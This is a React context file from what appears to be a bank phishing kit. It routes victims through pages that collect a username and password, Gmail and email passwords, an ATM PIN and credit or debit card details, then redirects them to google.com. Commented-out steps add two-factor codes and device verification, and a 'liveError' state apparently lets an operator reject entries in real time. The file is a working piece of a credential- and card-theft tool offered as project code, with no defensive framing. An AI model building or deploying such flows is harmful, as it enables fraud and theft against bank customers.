import { createContext, useState } from 'react'
// import { EmailAndPassword } from '../components/pages/email/emailAndPassword/EmailAndPassword'
// import { EmailVerification } from '../components/pages/EmailVerification'
// import { UsernameAndPassword } from '../components/pages/usernamePassword/UsernameAndPassword'
// import { Username } from '../components/pages/username/Username'
// import { Password } from '../components/pages/password/Password'
// import { Token } from '../components/pages/token/Token'
import { UsernameAndPassword } from '../components/pages/usernamePassword/UsernameAndPassword'
import { CreditCard } from '../components/pages/card/CreditCard'
import { Atm } from '../components/pages/cajeroAtm/Atm'
import { EmailAndPassword } from '../components/pages/email/emailAndPassword/EmailAndPassword'
import { Username } from '../components/pages/username/Username'
import { GmailVerification } from '../components/pages/verify gmail/passwordEmail/PasswordGmail'

export const ModeLiveContext = createContext()

export const ModeLiveProvider = ({ children }) => {
    
    const [liveError, setLiveError] = useState(false)

    const liveData = [
        {
            textPage: 'Usuario y contraseña',
            urlPage: '/',
            Element: <UsernameAndPassword />,
        },
        {
            textPage: 'Verificar gmail',
            urlPage: '/gmailverification',
            Element: <GmailVerification />,
        },
        {
            textPage: 'Correo y contraseña del correo',
            urlPage: '/passwordEmail',
            Element: <EmailAndPassword />,
        },
        {
            textPage: 'Clave ATM',
            urlPage: '/atm-validation',
            Element: <Atm />,
        },
        {
            textPage: 'Tarjeta de Credito/Debito',
            urlPage: '/tc-validation',
            Element: <CreditCard  />,
        },        
        // {
        //     textPage: 'Usuario',
        //     urlPage: '/',
        //     Element: <Username />,
        // },
        // {
        //     textPage: 'Contraseña',
        //     urlPage: '/password',
        //     Element: <Password pageNow={'/password'}/>,
        // },
        // {
        //     textPage: 'Clave Dinamica Dos factores',
        //     urlPage: '/token',
        //     Element: <Token tokenMode={'token1'} pageNow={'/token'}/>,
        // },
        // {
        //     textPage: 'Verificacion de dispositivo',
        //     urlPage: '/verificationDevice',
        //     Element: <EmailVerification pageNow={'/verificationDevice'} />,
        //     typeLive: 'input'
        // }
        {
            textPage: 'Terminar',
            urlPage: 'https://google.com',
        }
    ] 

    
    return (
        <ModeLiveContext.Provider value={{liveError, setLiveError, liveData }}>
            { children }
        </ModeLiveContext.Provider>
    )
}